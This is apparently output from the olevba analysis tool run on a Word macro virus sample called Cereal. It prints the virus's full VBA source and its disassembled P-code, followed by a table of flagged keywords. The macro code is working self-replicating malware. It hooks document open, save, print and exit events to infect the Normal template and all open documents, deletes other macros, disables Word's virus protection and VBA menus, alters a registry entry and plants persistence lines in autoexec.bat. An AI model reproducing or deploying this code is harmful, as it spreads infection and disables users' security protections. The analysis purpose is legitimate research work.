olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cereal
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cereal - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cereal.bas 
in file: ./Virus.MSWord.Cereal - OLE stream: 'Macros/VBA/Cereal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Call stealth
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoExec()
    Call stealth
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Application.UserName = "Cereal"
    Application.UserAddress = "Cereal"
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call clascopy
End Sub
Sub AutoExit()
    On Error Resume Next
    Call clascopy
    Application.Quit
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" _
    And ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" And _
    ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    Call payload
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub

Sub clascopy()
   On Error Resume Next
   Call stealth
    infected = False
        For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
                modname = NormalTemplate.VBProject.VBComponents(A_A).Name
                If modname = "Cereal" Then
                    infected = True
                    e = NormalTemplate.VBProject.VBComponents(2).CodeModule.countoflines
                    vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                End If
                If (modname <> "Cereal") And (modname <> "ThisDocument") Then
                    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                End If
        Next A_A
        For Each documentopen In Documents
            Docinfected = False
            With documentopen
                 For Cerealclaw = documentopen.VBProject.VBComponents.Count To 1 Step -1
                    modname = documentopen.VBProject.VBComponents(Cerealclaw).Name
                    If modname = "Cereal" Then
                          Docinfected = True
                          e = documentopen.VBProject.VBComponents(2).CodeModule.countoflines
                          vircode = documentopen.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    End If
                    If (modname <> "Cereal") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                        Application.OrganizerDelete Source:=documentopen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                    End If
                Next Cerealclaw
                If Docinfected = False Then
                     documentopen.VBProject.VBComponents.Add(1).Name = "Cereal"
                     e = NormalTemplate.VBProject.VBComponents(2).CodeModule.countoflines
                     vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                     documentopen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                End If
            End With
        Next documentopen
            If infected = False Then
                    NormalTemplate.VBProject.VBComponents.Add(1).Name = "Cereal"
                    e = ActiveDocument.VBProject.VBComponents(2).CodeModule.countoflines
                    vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode & "'Infected Date :==> " & Date
                    NormalTemplate.Save
            End If

End Sub
Sub stealth()
   On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    Application.UserName = "Cereal"
    Application.UserAddress = "Cereal"
    Dialogs(wdDialogFileSummaryInfo).Author = "Cereal"
    Dialogs(wdDialogFileSummaryInfo).Title = "Cereal"
    Dialogs(wdDialogFileSummaryInfo).Execute
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "retupmoC yM"
    Hack = Shell("c:\windows\command\xcopy.exe /I " & Chr(34) & NormalTemplate.Path & "\normal.dot" & Chr(34) & " c:\windows\cereal.sys", vbHide)
    Call stealth2
End Sub

Sub stealth2()
    On Error Resume Next
    auto$ = Dir("c:\autoexec.bat")
    startwrite = FreeFile
    If auto$ <> "" Then
        ChDir ("c:\")
        Open auto$ For Input As startwrite
        While Not EOF(startwrite)
            Input #startwrite, batcode
            mypos = InStr(1, batcode, "cereal.sys") ' Returns 0.
        Wend
        Close #1
        If mypos = 0 Then
            Open auto$ For Append Access Write As startwrite
            Print #startwrite, "@echo off"
            Print #startwrite, "del " & Chr(34) & NormalTemplate.Path & "\Normal.dot" & Chr(34)
            Print #startwrite, "copy c:\windows\cereal.sys " & Chr(34) & NormalTemplate.Path & "\Normal.dot" & Chr(34)
            Close #startwrite
        End If
    End If
End Sub
'Infected Date :==> 31/12/99

'Infected Date :==> 11.05.99

'Infected Date :==> 1/18/2000

'Infected Date :==> 3/23/00

'Infected Date :==> 3/23/00

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cereal
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1261 bytes
' Macros/VBA/Cereal - 9455 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	ArgsCall (Call) stealth 0x0000 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #4:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub AutoExec())
' Line #7:
' 	ArgsCall (Call) stealth 0x0000 
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #10:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub FileSaveAs())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #15:
' 	LitStr 0x0006 "Cereal"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0006 "Cereal"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #17:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Sub FilePageSetup())
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #22:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub FilePrint())
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #27:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub FileOpen())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #32:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #33:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub AutoClose())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub AutoExit())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #42:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub FileSave())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #47:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub FileClose())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #52:
' 	LineCont 0x0004 09 00 04 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #53:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FileExit())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #60:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #61:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ArgsCall (Call) payload 0x0000 
' Line #64:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub FileNew())
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #69:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub clascopy())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	ArgsCall (Call) stealth 0x0000 
' Line #75:
' 	LitVarSpecial (False)
' 	St infected 
' Line #76:
' 	StartForVariable 
' 	Ld A_A 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #77:
' 	Ld A_A 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St modname 
' Line #78:
' 	Ld modname 
' 	LitStr 0x0006 "Cereal"
' 	Eq 
' 	IfBlock 
' Line #79:
' 	LitVarSpecial (True)
' 	St infected 
' Line #80:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St e 
' Line #81:
' 	LitDI2 0x0001 
' 	Ld e 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vircode 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld modname 
' 	LitStr 0x0006 "Cereal"
' 	Ne 
' 	Paren 
' 	Ld modname 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #84:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld modname 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld A_A 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	StartForVariable 
' 	Ld documentopen 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #88:
' 	LitVarSpecial (False)
' 	St Docinfected 
' Line #89:
' 	StartWithExpr 
' 	Ld documentopen 
' 	With 
' Line #90:
' 	StartForVariable 
' 	Ld Cerealclaw 
' 	EndForVariable 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #91:
' 	Ld Cerealclaw 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St modname 
' Line #92:
' 	Ld modname 
' 	LitStr 0x0006 "Cereal"
' 	Eq 
' 	IfBlock 
' Line #93:
' 	LitVarSpecial (True)
' 	St Docinfected 
' Line #94:
' 	LitDI2 0x0002 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St e 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld e 
' 	LitDI2 0x0002 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vircode 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Ld modname 
' 	LitStr 0x0006 "Cereal"
' 	Ne 
' 	Paren 
' 	Ld modname 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld modname 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #98:
' 	Ld documentopen 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld modname 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld Cerealclaw 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	Ld Docinfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitStr 0x0006 "Cereal"
' 	LitDI2 0x0001 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #103:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St e 
' Line #104:
' 	LitDI2 0x0001 
' 	Ld e 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vircode 
' Line #105:
' 	LitDI2 0x0001 
' 	Ld vircode 
' 	LitDI2 0x0002 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	EndWith 
' Line #108:
' 	StartForVariable 
' 	Ld documentopen 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	Ld infected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #110:
' 	LitStr 0x0006 "Cereal"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #111:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St e 
' Line #112:
' 	LitDI2 0x0001 
' 	Ld e 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vircode 
' Line #113:
' 	LitDI2 0x0001 
' 	Ld vircode 
' 	LitStr 0x0014 "'Infected Date :==> "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #114:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #115:
' 	EndIfBlock 
' Line #116:
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub stealth())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #121:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #122:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #123:
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #124:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #125:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #126:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #127:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #128:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #129:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #130:
' 	LitVarSpecial (False)
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #131:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #133:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #134:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #135:
' 	LitStr 0x0006 "Cereal"
' 	Ld Application 
' 	MemSt UserName 
' Line #136:
' 	LitStr 0x0006 "Cereal"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #137:
' 	LitStr 0x0006 "Cereal"
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	MemSt Author 
' Line #138:
' 	LitStr 0x0006 "Cereal"
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	MemSt Title 
' Line #139:
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #140:
' 	LitStr 0x000B "retupmoC yM"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #141:
' 	LitStr 0x0020 "c:\windows\command\xcopy.exe /I "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x000B "\normal.dot"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0016 " c:\windows\cereal.sys"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St Hack 
' Line #142:
' 	ArgsCall (Call) stealth2 0x0000 
' Line #143:
' 	EndSub 
' Line #144:
' Line #145:
' 	FuncDefn (Sub stealth2())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	St auto$ 
' Line #148:
' 	Ld Friend 
' 	St startwrite 
' Line #149:
' 	Ld auto$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #150:
' 	LitStr 0x0003 "c:\"
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #151:
' 	Ld auto$ 
' 	Ld startwrite 
' 	LitDefault 
' 	Open (For Input)
' Line #152:
' 	Ld startwrite 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #153:
' 	Ld startwrite 
' 	Sharp 
' 	Input 
' 	Ld batcode 
' 	InputItem 
' 	InputDone 
' Line #154:
' 	LitDI2 0x0001 
' 	Ld batcode 
' 	LitStr 0x000A "cereal.sys"
' 	FnInStr3 
' 	St mypos 
' 	QuoteRem 0x0034 0x000B " Returns 0."
' Line #155:
' 	Wend 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #157:
' 	Ld mypos 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #158:
' 	Ld auto$ 
' 	Ld startwrite 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #159:
' 	Ld startwrite 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #160:
' 	Ld startwrite 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x000B "\Normal.dot"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #161:
' 	Ld startwrite 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "copy c:\windows\cereal.sys "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x000B "\Normal.dot"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #162:
' 	Ld startwrite 
' 	Sharp 
' 	Close 0x0001 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	EndSub 
' Line #166:
' 	QuoteRem 0x0000 0x001B "Infected Date :==> 31/12/99"
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x001B "Infected Date :==> 11.05.99"
' Line #169:
' Line #170:
' 	QuoteRem 0x0000 0x001C "Infected Date :==> 1/18/2000"
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x001A "Infected Date :==> 3/23/00"
' Line #173:
' Line #174:
' 	QuoteRem 0x0000 0x001A "Infected Date :==> 3/23/00"
' Line #175:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |documentopen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |xcopy.exe           |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

